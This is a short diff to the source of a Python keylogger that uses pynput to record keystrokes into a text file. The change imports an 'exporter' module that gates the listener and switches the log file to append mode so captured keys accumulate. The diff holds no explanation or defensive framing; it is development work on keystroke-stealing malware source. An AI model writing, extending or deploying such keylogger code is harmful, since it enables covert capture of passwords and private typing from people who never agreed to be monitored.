@@ -3,12 +3,15 @@ Python Keylogger
 By Connor Jackson
 """
 from pynput import keyboard
+import exporter
 
 output_file = "record.txt"
 
 
 def on_press(key):
-    file1 = open(output_file, 'w')
+    if not exporter.RUNNING:
+        return False
+    file1 = open(output_file, 'a')
     try:
         print(key)
         file1.write(key.char)
@@ -45,7 +48,6 @@ def on_release(key):
 
 
 def listen():
-    # global file1
     with keyboard.Listener(
             on_press=on_press,
             on_release=on_release) as listener:
